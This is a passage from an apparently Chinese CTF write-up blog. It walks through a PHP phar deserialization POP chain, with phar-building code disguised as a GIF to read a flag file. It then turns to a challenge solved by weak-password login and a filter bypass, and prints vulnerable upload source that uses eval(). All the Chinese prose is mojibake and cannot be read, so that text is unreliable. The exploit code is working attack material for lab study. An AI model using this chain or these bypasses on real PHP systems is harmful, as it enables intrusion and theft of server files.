    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;index.php&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br></div></div><p>class.phpä¸­åˆç»™äº†è¿™ä¹ˆå¤šç±»ï¼Œä¼°è®¡æ˜¯è¦è€ƒå¯Ÿååºåˆ—åŒ–ï¼Œæ–‡ä»¶ä¸Šä¼ +ååºåˆ—åŒ–ï¼Œç›´æ¥å¾ˆè‡ªç„¶çš„è”æƒ³åˆ°pharæ–‡ä»¶ã€‚</p> <p>ä¸‹é¢çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆåœ°æ–¹å¯ä»¥è§¦å‘pharæ–‡ä»¶çš„ååºåˆ—åŒ–</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code>//file.php

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;content-type:text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
<span class="token keyword">include</span> <span class="token single-quoted-string string">'function.php'</span><span class="token punctuation">;</span> 
<span class="token keyword">include</span> <span class="token single-quoted-string string">'class.php'</span><span class="token punctuation">;</span> 
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'open_basedir'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'/var/www/html/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token double-quoted-string string">&quot;&quot;</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'file doesn\'t exists.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> 
<span class="token delimiter important">?&gt;</span></span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712171614.png" alt="image-20200712171614629"></p> <p>æ‰¾åˆ°file_exists()å‡½æ•°ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾POPé“¾ç„¶åç”Ÿæˆpharæ–‡ä»¶äº†ã€‚å¯»æ‰¾ååºåˆ—åŒ–çš„å…¥å£__destruct()ï¼Œè¯¥é­”æœ¯æ–¹æ³•ä»…åœ¨C1e4rç±»ä¸­å­˜åœ¨ï¼ŒShowç±»ä¸­æœ‰__toString()æ–¹æ³•ï¼Œè€Œ__destruct()ä¸­çš„<code>echo</code>ä¼šè§¦å‘è¯¥æ–¹æ³•ï¼Œæ‰€ä»¥ç›´æ¥è®©<code>$this-&gt;str = new Show()</code>å³å¯ï¼Œsträ¼šèµ‹å€¼ç»™testï¼Œä»è€Œè§¦å‘__toString()ï¼ŒTestç±»ä¸­æœ‰__get()æ–¹æ³•ï¼Œå¦‚æœè®©__toString()ç±»ä¸­çš„<code>str['str'] = new Test()</code>ï¼Œé‚£ä¹ˆstr['str']å°±ä¼šè®¿é—®æœ¬ç±»ä¸­ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡sourceï¼Œä»è€Œè§¦å‘__get()ï¼Œç„¶åå°±å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–äº†ã€‚</p> <p>ç”Ÿæˆpharæ–‡ä»¶ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">C1e4r</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Show</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">str</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">Test</span>
<span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">params</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;/var/www/html/f1ag.php&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;1.phar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;1.phar&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;GIF98a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                      

<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;test.txt&quot;</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">&quot;test&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br></div></div><p>åç¼€æ”¹æˆgifè¿›è¡Œä¸Šä¼ ï¼Œè®¡ç®—è¢«é‡å‘½åä¹‹åçš„æ–‡ä»¶åï¼Œç„¶ååˆ©ç”¨pharåè®®æ‹¿åˆ°base64ç¼–ç ä¹‹åçš„f1ag.phpï¼Œè§£ç å³å¯ã€‚</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200712173314.png" alt="image-20200712173314801"></p> <h3 id="babysqliv0"><a href="#babysqliv0" class="header-anchor">#</a> BabysqliV0</h3> <p>ç™»å½•æ¡†æ³¨äº†å¥½ä¹…ç»“æœæ˜¯å¼±å£ä»¤çˆ†ç ´ï¼Ÿï¼Ÿæˆ‘æ™•ï¼Œè¢«é¢˜ç›®è¯¯å¯¼äº†Â·Â·Â·</p> <p>admin passwordå¯ä»¥ç›´æ¥ç™»å½•</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200714211706.png" alt="image-20200714211640995"></p> <p>å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå°è¯•è¯»ä¸€ä¸‹uploadçš„æºç çœ‹çœ‹ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200714211944.png" alt="image-20200714211944271"></p> <p>è¿™é‡Œæœ‰ç‚¹å°å‘ï¼Œä¸€å¼€å§‹æˆ‘çš„payloadæ˜¯<code>resource=upload.php</code>ï¼Œç»“æœæ€ä¹ˆä¹Ÿç»•ä¸äº†WAFï¼Œçœ‹æ¥WPæ‰çŸ¥é“æ˜¯<code>resouce=upload</code>ï¼Œä¸è¿‡åšå®Œé¢˜ç›®å‘ç°äº†ä¸€ä¸ªæ²¡æ³¨æ„åˆ°çš„ç»†èŠ‚ï¼š</p> <p><img src="https://cdn.jsdelivr.net/gh/F4ded/blog-pic/blog/20200714212316.png" alt="image-20200714212316184"></p> <p>çº¢çº¿éƒ¨åˆ†æ˜¯<code>upload.php.</code>ï¼Œå¯ä»¥çœ‹çš„å‡ºç¬¬äºŒä¸ª<code>.</code>ä¹‹åçš„phpåº”è¯¥æ˜¯è¢«WAFæ‰äº†ï¼Œç„¶åç¬¬ä¸€ä¸ª<code>.php</code>é¢˜ç›®æœ¬èº«è‡ªå¸¦çš„ï¼Œæ‰€ä»¥ç›´æ¥å†™<code>resource=upload</code>å°±è¡Œäº†</p> <p>æ‹¿åˆ°upload.phpçš„æºç ï¼š</p> <div class="language-php line-numbers-mode"><pre class="language-php"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Content-Type<span class="token punctuation">&quot;</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>text/html; charset=utf-8<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span> 

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span><span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>multipart/form-data<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
	ä¸Šä¼ æ–‡ä»¶
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>file<span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>ä¸Šä¼ <span class="token punctuation">&quot;</span></span> <span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name">Uploader</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$Filename</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>
	

	<span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;/uploads/&quot;</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;/&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;.txt&quot;</span><span class="token punctuation">;</span>
		@<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';&quot;</span><span class="token punctuation">;</span>
		<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>
		<span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;[^a-z0-9]&quot;</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;die('illegal filename!');&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">else</span><span class="token punctuation">{</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
				<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;die('you are too big (â€²â–½`ã€ƒ)');&quot;</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
			<span class="token keyword">else</span><span class="token punctuation">{</span>
				<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;move_uploaded_file('&quot;</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;', '&quot;</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">&quot;');&quot;</span><span class="token punctuation">;</span>
			<span class="token punctuation">}</span>
		<span class="token punctuation">}</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">global</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>
		<span class="token keyword">global</span> <span class="token variable">$ext</span><span class="token punctuation">;</span>
		<span class="token comment">// return $sandbox.$this-&gt;Filename.$ext;</span>
		<span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">Filename</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">token</span> <span class="token operator">!=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
			<span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token double-quoted-string string">&quot;die('check token falied!');&quot;</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$uploader</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$uploader</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">&quot;file&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token keyword">echo</span> <span class="token double-quoted-string string">&quot;ä¸‹é¢æ˜¯ä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼š&lt;br&gt;&quot;</span><span class="token punctuation">.</span><span class="token variable">$uploader</span><span class="token punctuation">.</span><span class="token double-quoted-string string">&quot;&lt;br&gt;&quot;</span><span class="token punctuation">;</span>
		<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$uploader</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
